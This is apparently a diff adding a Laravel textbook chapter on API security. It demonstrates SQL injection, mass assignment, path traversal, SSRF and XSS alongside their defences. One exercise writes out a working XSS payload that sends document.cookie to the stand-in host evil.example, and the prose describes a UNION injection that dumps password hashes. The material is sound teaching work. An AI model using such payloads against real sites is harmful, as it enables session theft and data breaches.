@@ -1,0 +1,250 @@
+<section class="chapter" data-chapter="{{n}}" data-code="b3/laravel/security/en">
+<p class="chapter-kicker">Chapter {{n}}</p>
+<h1>Security: Attacks and Defences</h1>
+
+<div class="goals">
+<p class="goals-title">In this chapter you will learn to</p>
+<ul>
+<li>think like an attacker, using the OWASP Top 10 as a map</li>
+<li>see SQL injection steal password hashes, and make it impossible with bindings</li>
+<li>stop clients from writing fields they must not touch</li>
+<li>keep user input out of file paths and other dangerous places</li>
+<li>protect browser users with security headers, CORS and Laravel’s own defences</li>
+<li>handle limits, debug mode, secrets and dependencies like a professional</li>
+</ul>
+</div>
+
+<p class="lead">Every API on the internet is probed by scripts within hours of going online. Most of what they try is old and well known, and most successful attacks still use the same few mistakes: input treated as code, missing checks, secrets in the wrong place. Laravel prevents many of them by default, which makes it all the more important to know where its protection ends. This chapter commits the mistakes on purpose. Each attack gets two routes side by side, the obvious version under <code>/unsafe</code> and the safe one, and every attack is run for real with <code>curl</code>.</p>
+
+<aside class="bit" data-mood="wow"><p>The first time I ran a security scanner against an API I had built, it found a search box that accepted SQL. I had used string interpolation because it was “just for a search”. Within a minute, the scanner had listed every table in my database. Nothing was stolen, because it was a test server. It was the most useful minute of my career.</p></aside>
+
+<h2>{{n}}.1 Thinking like an attacker</h2>
+
+<p>An attacker reads your API differently from a user: every input is a chance to make the server do something it was not meant to do. The <dfn>OWASP Top 10</dfn>, a list kept by the Open Worldwide Application Security Project from data on real breaches, names the most common ways this succeeds. Its 2025 edition, and where this book deals with each:</p>
+
+<table>
+<thead><tr><th>Risk</th><th>In short</th><th>Where</th></tr></thead>
+<tbody>
+<tr><td>Broken access control</td><td>Users reach data or actions that are not theirs</td><td>Chapter {{n-1}}, and {{n}}.3</td></tr>
+<tr><td>Security misconfiguration</td><td>Defaults, debug output, missing headers</td><td>{{n}}.5 and {{n}}.6</td></tr>
+<tr><td>Software supply chain failures</td><td>Vulnerable or malicious dependencies</td><td>{{n}}.8</td></tr>
+<tr><td>Cryptographic failures</td><td>Weak hashing, no HTTPS, secrets in clear</td><td>Chapter {{n-1}}, and {{n}}.7</td></tr>
+<tr><td>Injection</td><td>Input executed as SQL, commands or HTML</td><td>{{n}}.2 and {{n}}.5</td></tr>
+<tr><td>Insecure design</td><td>The flaw is in the plan, not the code</td><td>Every chapter’s “professional habit”</td></tr>
+<tr><td>Authentication failures</td><td>Guessable passwords, unlimited attempts</td><td>Chapter {{n-1}}</td></tr>
+<tr><td>Software or data integrity failures</td><td>Trusting updates or data that were not checked</td><td>{{n}}.8</td></tr>
+<tr><td>Security logging and alerting failures</td><td>Attacks that nobody notices</td><td>Chapter {{n+4}}</td></tr>
+<tr><td>Mishandling of exceptional conditions</td><td>Errors that leak details or fail open</td><td>{{n}}.6</td></tr>
+</tbody>
+</table>
+
+<p>Two principles run through all of it. <strong>Never trust input</strong>: anything from the client (body, query, headers, cookies, file names) may be written by an attacker. And <strong>defence in depth</strong>: each layer assumes the one before it might fail.</p>
+
+<h2>{{n}}.2 Injection</h2>
+
+<p>The search below puts the input into its SQL with PHP’s string interpolation. For an ordinary search it works perfectly, which is exactly why this bug survives code review:</p>
+
+<pre data-code="shop/routes/api.php" data-from="Route::get('unsafe/products'" data-to="^});#2" data-title="routes/api.php"></pre>
+
+<pre data-code="injection.sh" data-title="Terminal"></pre>
+
+<p>The attacker’s input closed the quote, added a <code>UNION</code> that reads the users table, and commented out the rest with <code>--</code>. The database cannot tell which part of the text came from the programmer and which from the attacker, so it ran all of it, and the response contains every email and password hash. With a little more work the same hole reads any table, changes data, or worse.</p>
+
+<p>The safe route sends the same input as a <dfn>binding</dfn>: the SQL text, with <code>?</code>, and the value travel to PostgreSQL separately, so the value can never become code. It simply searched for a product with that strange name, and found none. Eloquent and the query builder bind every value for you, so <code>Product::where('name', $q)</code> is safe. The danger remains wherever text is pasted into SQL:</p>
+<ul>
+<li>The <code>Raw</code> methods (<code>whereRaw</code>, <code>selectRaw</code>, <code>orderByRaw</code>, <code>DB::raw</code>) and <code>DB::select</code> take SQL text: give them bindings as their second argument, never interpolated variables.</li>
+<li><strong>Column names</strong>, such as the field to sort by, cannot be bindings. Validate them against a fixed list with <code>Rule::in(['name', 'price'])</code>, as Chapter {{n-6}}’s requests did.</li>
+<li>The same bug exists outside SQL: shell commands built from input (use <code>Process::run</code> with an array of arguments), and HTML built from input (section {{n}}.5).</li>
+</ul>
+
+<h2>{{n}}.3 Mass assignment</h2>
+
+<p>An update that writes whatever fields arrive is convenient: add a column, and the route supports it at once. It also supports columns nobody meant to expose:</p>
+
+<pre data-code="shop/routes/api.php" data-from="Route::patch('unsafe/users" data-to="^});#2" data-title="routes/api.php"></pre>
+
+<pre data-code="mass.sh" data-title="Terminal"></pre>
+
+<p>Omar sent one extra field and became an admin. This is <dfn>mass assignment</dfn>, a form of broken access control. Laravel has two layers against it, and the unsafe route had to switch both off:</p>
+<ul>
+<li><strong>The model’s fillable list.</strong> <code>User</code> declares <code>#[Fillable(['name', 'email', 'password'])]</code>, so <code>update()</code> and <code>create()</code> ignore <code>role</code>. <code>forceFill()</code> exists for trusted code, such as seeders, and skips the list. With <code>Model::preventSilentlyDiscardingAttributes()</code> from Chapter {{n-4}}, an attempt to fill <code>role</code> throws instead of being ignored.</li>
+<li><strong>Validated data only.</strong> <code>$request-&gt;validate()</code> returns only the fields that have rules, never <code>$request-&gt;all()</code>. The <code>prohibited</code> rule goes further and refuses a request that sends <code>role</code> at all, so the client learns it is not allowed rather than wondering why nothing happened. Changing a role is a different route, for admins only.</li>
+</ul>
+
+<h2>{{n}}.4 Paths and other dangerous places</h2>
+
+<p>Serving files from a folder by name looks harmless. But a name is input, and <code>..</code> means “the folder above”:</p>
+
+<pre data-code="shop/routes/api.php" data-from="Route::get('unsafe/files" data-to="^})->where('path', '.*');#2" data-title="routes/api.php"></pre>
+
+<pre data-code="traversal.sh" data-title="Terminal"></pre>
+
+<p>This is <dfn>path traversal</dfn>, and here it handed over the <code>.env</code> file: the application key that signs and encrypts cookies, and the database password. The safe route reads through a <dfn>disk</dfn> rooted at the folder; Laravel’s storage layer (Flysystem) refuses any path that climbs out of its root, and the route turns that refusal into a 404. Better still is not to use the client’s text as a path at all: store uploads with <code>$file-&gt;store('products')</code>, which picks a random name, keep the original name in the database, and look up by id.</p>
+
+<p>The same idea applies to every place where input reaches something powerful:</p>
+<ul>
+<li><strong>URLs the server fetches</strong> (“import a product image from this address”). An attacker gives <code>http://localhost:5432</code> or the cloud provider’s internal metadata address, and your server, inside your network, fetches it for them. This is <dfn>server-side request forgery</dfn> (SSRF), exercise 5.</li>
+<li><strong>Redirects</strong> (<code>?next=…</code> after sign-in): only allow paths on your own site, or an attacker sends users to a fake copy of it. <code>redirect()-&gt;intended()</code> stays on your site.</li>
+<li><strong>Unserialising</strong> data from the client with <code>unserialize()</code> can create arbitrary objects; accept JSON instead.</li>
+</ul>
+
+<aside class="box warn"><p class="box-title">Watch out: validation is not escaping</p><p>Validating input (“the name is 1 to 100 characters”) and making it safe for a destination (SQL, a path, HTML, a shell) are different jobs. A perfectly valid product name can contain a quote, <code>..</code> or <code>&lt;script&gt;</code>. Validate at the edge, and make values safe where they are used, with the tool made for that destination: bindings, disks, Blade’s escaping.</p></aside>
+
+<h2>{{n}}.5 Protecting browser users</h2>
+
+<p>An API is often called from a website, and the browser adds attacks of its own. Laravel already handles much of them for its own pages:</p>
+<ul>
+<li><dfn>Cross-site scripting</dfn> (XSS): an attacker gets their script into a page other people see, for example as a product review, and it runs with the visitor’s session. Blade’s <code>{{ }}</code> escapes everything; <code>{!! !!}</code> does not, and is the place to look in a review. An API protects itself by returning JSON with the right <code>Content-Type</code>, and the frontend by escaping, as Vue and React do except in <code>v-html</code> and <code>dangerouslySetInnerHTML</code>.</li>
+<li><dfn>Cross-site request forgery</dfn> (CSRF): another site makes the browser send a request to yours, and the browser attaches your cookies. Laravel’s web routes check a CSRF token on every form; its session cookie is <code>SameSite=Lax</code>; and tokens in the <code>Authorization</code> header, as in Chapter {{n-1}}, are never sent automatically at all.</li>
+<li><dfn>Clickjacking</dfn>: your page is loaded invisibly inside another site, and the user is tricked into clicking your buttons.</li>
+</ul>
+
+<p>Browsers can refuse much of this if the server asks them to, with <dfn>security headers</dfn>. Laravel does not set them by default; a small middleware, added to every response in <code>bootstrap/app.php</code>, does:</p>
+
+<pre data-code="shop/app/Http/Middleware/SecurityHeaders.php" data-from="public function handle" data-to="^    }" data-title="app/Http/Middleware/SecurityHeaders.php"></pre>
+
+<pre data-code="shop/bootstrap/app.php" data-from="withMiddleware" data-to="    })" data-title="bootstrap/app.php"></pre>
+
+<pre data-code="headers.sh" data-title="Terminal"></pre>
+
+<ul>
+<li><code>Content-Security-Policy</code> lists where scripts, styles and images may come from. An API answers with JSON and needs none of them, so <code>default-src 'none'</code> refuses everything; a website lists its own sources. It is the strongest defence against XSS in pages.</li>
+<li><code>Strict-Transport-Security</code> tells the browser to use only HTTPS for this site for a year, so nobody can downgrade a visit to plain HTTP.</li>
+<li><code>X-Frame-Options</code> and <code>frame-ancestors</code> stop other sites from framing yours; <code>X-Content-Type-Options: nosniff</code> stops the browser from guessing that a text file is a script.</li>
+</ul>
+
+<p><dfn>CORS</dfn> (cross-origin resource sharing) is the other half. By default a script on <code>evil.example</code> may send a request to your API but may not read the answer. CORS headers relax that for the origins you name. Laravel answers CORS from <code>config/cors.php</code> (created by <code>php artisan config:publish cors</code>), here limited to the shop’s website and two methods:</p>
+
+<pre data-code="shop/config/cors.php" data-from="'paths'" data-to="'allowed_origins'" data-title="config/cors.php"></pre>
+
+<pre data-code="cors.sh" data-title="Terminal"></pre>
+
+<p>Both requests got <code>Access-Control-Allow-Origin: https://shop.example</code>: with a single allowed origin, Laravel always names it. A browser compares that value with the origin of the page that made the request; for the script on <code>evil.example</code> they differ, so the browser hides the response from it. Note what CORS is <em>not</em>: it does not stop <code>curl</code>, scripts or servers, which ignore it, and it does not stop the request from reaching your server. It protects users’ browsers, not your API; authentication and authorization still do that. Never allow every origin with <code>*</code> on an API that uses cookies.</p>
+
+<aside class="box quiz"><p class="box-title">Quick check</p><ol><li>Why does a binding stop SQL injection when escaping quotes by hand often fails?</li><li>Without the <code>prohibited</code> rule, what would the safe users route do with the extra <code>role</code> field?</li><li>The request from <code>evil.example</code> reached the server in the CORS example. Why is that not a problem?</li></ol><p>The answers are at the end of the chapter, after the summary.</p></aside>
+
+<h2>{{n}}.6 Limits and errors</h2>
+
+<p>An attacker does not need to break in to hurt you; making the server too busy for real users is enough, so every input needs a size. Each string in each rule set gets a <code>max</code>, every list a maximum page size, expensive routes a rate limiter (Chapter {{n-7}}), and the web server a limit on request bodies (PHP’s <code>post_max_size</code> and <code>upload_max_filesize</code>, and <code>client_max_body_size</code> in nginx):</p>
+
+<pre data-code="errors.sh" data-title="Terminal"></pre>
+
+<p>The last request above hit a broken query, and the client learned only “Server Error”. That is because <code>APP_DEBUG</code> is <code>false</code>. Here is the same error on a server with debug mode on:</p>
+
+<pre data-code="debug.sh" data-title="Terminal"></pre>
+
+<p>The error names the database, its host and port, the failing SQL, and where the code lives; the full answer also has a stack trace through the framework. On a development machine this is exactly what you want; in production it is a map for attackers. <strong><code>APP_DEBUG=false</code> in production, always</strong>, and the details go to the log (Chapter {{n+4}}), where only you can read them. <code>php artisan about</code> shows the current setting.</p>
+
+<h2>{{n}}.7 Secrets and configuration</h2>
+
+<p>The <code>.env</code> file that path traversal leaked holds the most valuable things the application has. Rules for it:</p>
+
+<pre data-code="audit.sh" data-title="Terminal"></pre>
+
+<ul>
+<li><strong>Never in the repository.</strong> Laravel’s <code>.gitignore</code> already excludes <code>.env</code> (the first part of the output above); <code>.env.example</code>, with every name and no real value, documents what is needed. A secret pushed once is in the history forever: change it, do not just delete the file.</li>
+<li><strong>Different in every environment</strong>, set by the platform (Chapter {{n+7}}’s containers receive them as environment variables) or a secret manager. The <code>APP_KEY</code> signs and encrypts cookies and encrypted values: a leaked key lets an attacker forge them, so changing it is urgent, and <code>APP_PREVIOUS_KEYS</code> keeps old encrypted data readable while you do.</li>
+<li><strong>Read through <code>config()</code>.</strong> Call <code>env()</code> only inside <code>config/*.php</code>; after <code>php artisan config:cache</code> in production, <code>env()</code> elsewhere returns <code>null</code>. A missing setting should fail loudly at start-up, not at the first request that needs it.</li>
+<li><strong>Never logged.</strong> Laravel hides <code>password</code> fields from validation errors and exceptions; keep tokens and keys out of your own log messages too.</li>
+</ul>
+
+<h2>{{n}}.8 Dependencies</h2>
+
+<p>The shop’s code is a few hundred lines; the packages in <code>vendor</code> are hundreds of thousands. A known vulnerability in an old version, a malicious package a typo away from a popular one, or an honest package whose maintainer’s account was stolen can all reach your server. <code>composer audit</code> (the second part of the output above) checks every installed version against a database of known vulnerabilities; run it in CI, and fail the build on findings. Commit <code>composer.lock</code> and deploy with <code>composer install</code>, so every machine gets exactly the versions you tested; let a bot (Dependabot, Renovate) open small update pull requests often; and before adding a package, look at who maintains it and whether a few lines of your own would do.</p>
+
+<aside class="box rule"><p class="box-title">Professional habit: a security checklist in every review</p><p>Keep a short checklist next to your pull request template: Is every input validated with a size? Does any input reach a <code>Raw</code> method, a path, a URL, a shell or <code>{!! !!}</code>? Is every new route behind authentication and a policy, with a test for the “no”? Are there new secrets, and are they in <code>.env</code> and <code>config/</code>? Are new packages needed and maintained? Thirty seconds per review prevents most of this chapter.</p></aside>
+
+<h2>Common mistakes</h2>
+
+<table>
+<thead><tr><th>Mistake</th><th>What happens</th><th>Fix</th></tr></thead>
+<tbody>
+<tr><td>Variables interpolated into SQL</td><td>Attackers read or change any table</td><td>Bindings; <code>Rule::in</code> for column names</td></tr>
+<tr><td><code>forceFill($request-&gt;all())</code> or <code>$guarded = []</code></td><td>Customers make themselves admins</td><td>Fillable lists and validated data only</td></tr>
+<tr><td>User input in file paths</td><td>Secrets and source code read from disk</td><td>Disks, random names, lookup by id</td></tr>
+<tr><td>Fetching URLs the client chose</td><td>The server attacks your own network</td><td>Allowlists of hosts, no internal addresses</td></tr>
+<tr><td><code>{!! !!}</code> with user content</td><td>Scripts run in other users’ browsers</td><td><code>{{ }}</code>, and a Content Security Policy</td></tr>
+<tr><td><code>APP_DEBUG=true</code> in production</td><td>SQL, hosts and code paths in every error</td><td><code>false</code>, and details in the log</td></tr>
+<tr><td>No <code>max</code> on strings and pages</td><td>One request ties up the server</td><td>A size on every input</td></tr>
+<tr><td>Secrets in the repository or the logs</td><td>Anyone with the code has the keys</td><td><code>.env</code>, environment variables, rotation</td></tr>
+<tr><td>Never updating packages</td><td>Known holes stay open for years</td><td><code>composer audit</code> in CI, small regular updates</td></tr>
+</tbody>
+</table>
+
+<h2>Summary</h2>
+
+<ul class="summary">
+<li><strong>Never trust input</strong>, and defend in depth; the <strong>OWASP Top 10</strong> is the map of what goes wrong most.</li>
+<li><strong>Injection</strong> happens when input becomes code: SQL takes <strong>bindings</strong>, column names take an allowlist.</li>
+<li><strong>Fillable lists</strong> and <strong>validated data</strong> stop mass assignment; disks stop traversal; allowlists stop SSRF and open redirects.</li>
+<li>Browsers are protected by <strong>security headers</strong>, <strong>CORS</strong> for named origins, CSRF tokens and <code>SameSite</code> cookies.</li>
+<li>Every input has a <strong>size</strong>, and <strong><code>APP_DEBUG</code> is off</strong> in production.</li>
+<li><strong>Secrets</strong> live in the environment, read through <code>config()</code>; dependencies are audited and updated often.</li>
+</ul>
+
+<p class="answers-note"><strong>Quick check answers:</strong> 1. With a binding, the SQL text and the value are sent separately, so the database never parses the value as SQL, whatever characters it contains. Escaping by hand tries to make the value harmless inside the text, and must anticipate every special character, encoding and database quirk; missing one is enough. 2. <code>validate()</code> would return only <code>name</code>, and the fillable list would ignore <code>role</code> anyway, so Omar would not become an admin; but the request would succeed without telling him the field is not allowed. <code>prohibited</code> refuses it with 422. 3. CORS is not meant to stop requests; it stops a browser from letting a script on another site read the response. The server still checks who is calling and what they may do; and the request here changed nothing.</p>
+
+<!-- projects -->
+<h2>Practice projects</h2>
+
+<p class="projects-intro">Each project hardens the shop’s API. For every defence, write a test that shows the attack failing.</p>
+
+<div class="project">
+<p class="project-label">Project {{n}}.1 · Easy</p>
+<h3>Harden the shop’s API</h3>
+<p class="project-goal">Apply this chapter’s defences to the API from Chapter {{n-6}}.</p>
+<p class="project-skills"><strong>You will practise:</strong> middleware, CORS configuration, environment settings and tests for them.</p>
+<ol class="steps">
+<li>Add the security headers middleware and CORS for one origin read from <code>.env</code> through <code>config/cors.php</code>.</li>
+<li>Check that <code>APP_DEBUG</code> is false in <code>.env.example</code>’s production notes, and that every string rule has a <code>max</code>.</li>
+<li>Write feature tests that check the headers, the CORS answer for the allowed origin, and that a broken route answers only “Server Error”.</li>
+</ol>
+<p class="hint"><strong>Hint:</strong> <code>$this-&gt;withHeaders(['Origin' =&gt; …])-&gt;get(…)-&gt;assertHeader(…)</code> tests CORS without a browser.</p>
+</div>
+
+<div class="project">
+<p class="project-label medium">Project {{n}}.2 · Medium</p>
+<h3>Attack your own code</h3>
+<p class="project-goal">Review the code of the previous chapters as an attacker, and fix what you find.</p>
+<p class="project-skills"><strong>You will practise:</strong> code review for security, writing exploits as tests, and fixing them.</p>
+<ol class="steps">
+<li>List every input of the API (body fields, query parameters, route parameters, headers) and where each one ends up.</li>
+<li>Search the code for <code>Raw(</code>, <code>DB::select</code>, <code>forceFill</code>, <code>$guarded</code>, <code>{!!</code> and <code>env(</code> outside <code>config/</code>.</li>
+<li>For every real problem, first write a test that shows the attack working, then fix it and watch the test change.</li>
+<li>Write a short report: what you tried, what you found, what you changed.</li>
+</ol>
+<p class="hint"><strong>Hint:</strong> look hard at sorting and filtering parameters; they are the usual place where column names come from the client.</p>
+</div>
+
+<div class="project">
+<p class="project-label hard">Project {{n}}.3 · Challenge</p>
+<h3>Safe product images</h3>
+<p class="project-goal">Let admins upload product images without opening a single hole.</p>
+<p class="project-skills"><strong>You will practise:</strong> file validation, checking contents, random names, and serving files safely.</p>
+<ol class="steps">
+<li>Accept an upload with the rules <code>file</code>, <code>image</code>, <code>mimes:png,jpg</code> and <code>max:2048</code>, admins only.</li>
+<li>Store it with <code>$request-&gt;file('image')-&gt;store('products', 'local')</code> (a random name, outside <code>public/</code>), and keep the path and original name in the database.</li>
+<li>Serve it through a route that looks it up by product id and returns <code>Storage::download()</code> or <code>response()-&gt;file()</code> with the type you checked and <code>nosniff</code>.</li>
+<li>Test an HTML file renamed to <code>.png</code>, a file of 3 MB, and a customer trying to upload.</li>
+</ol>
+<p class="hint"><strong>Hint:</strong> the <code>mimes</code> rule looks at the file’s contents, not only its name; still, never trust the name or the type the client sent when serving it back.</p>
+</div>
+<!-- /projects -->
+
+<h2>Exercises</h2>
+
+<ol class="exercises">
+<li><span class="level">Easy</span> A list route takes <code>?sort=price</code> and runs <code>Product::orderByRaw($request-&gt;sort)-&gt;get()</code>. Why can’t a binding fix it, and what does?</li>
+<li><span class="level">Easy</span> A colleague says: “We don’t need authentication on this route, CORS only allows our website.” What is wrong with that?</li>
+<li><span class="level">Medium</span> Before a <code>PATCH</code> with a JSON body from the shop’s website, the browser sends a <dfn>preflight</dfn> request. Send the same request with <code>curl</code>, and explain each header of the answer.</li>
+<li><span class="level">Medium</span> The admin page of the shop shows product names with <code>{!! $product-&gt;name !!}</code>, and someone creates a product named <code>&lt;img src=x onerror="fetch('//evil.example/?c='+document.cookie)"&gt;</code>. What happens when an admin opens the page, and which defences of this chapter each stop it?</li>
+<li><span class="level">Challenge</span> A new route imports a product image from a URL the admin types, with <code>Http::get($url)</code>. List three ways an attacker could abuse it, and the checks that stop each.</li>
+</ol>
+
+<p class="answers-note">Answers to the exercises are at the end of the book and in the book’s code repository.</p>
+
+<div class="next">
+<p class="next-title">Coming up in Chapter {{n+1}}</p>
+<p>Some work should not happen while the customer waits: emails, reports, image resizing. Queues and jobs: doing work later, retrying it safely, and never losing it.</p>
+</div>
+</section>
